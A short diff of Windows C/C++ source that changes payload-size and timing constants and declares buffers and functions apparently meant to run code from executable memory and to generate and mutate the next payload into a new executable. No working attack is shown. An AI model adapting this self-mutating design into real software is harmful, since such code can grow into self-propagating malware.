@@ -7,27 +7,21 @@
 //#include <iostream>
 #include<Windows.h>
 #include<sys\timeb.h> 
-int NextPayloadSize = 1024;
-#define NextNum 8
-#define GapTime 128
+
+int NextPayloadSize = 32768;
+#define NextNum 3
+#define GapTime 1024
 
 int myEXESize = 0;
 int myStaticLength = 0;
 int myPayloadLength = 0;
 UINT8* myFileBuffer = 0;
 UINT8* executeableMem = 0;
-//UINT8 nextPayloadBuf[NextPayloadSize] = { 0 };
 UINT8* nextPayloadBuf = 0;
+
 char nextEXEName[256] = { 0 };
 
-STARTUPINFOA si;
-PROCESS_INFORMATION pi;
-
 struct timeb AccuTime;
-
-//typedef void(*myFunc)(void);
-//void(*f1)(void) = (void(*)(void)) executeableMem;
-//static UINT8 myTestcode[] = { 0x90, 0x90, 0x90, 0xCC, 0xC3 };
 
 void GenNxtPayload();
 void MuNxtPayload();
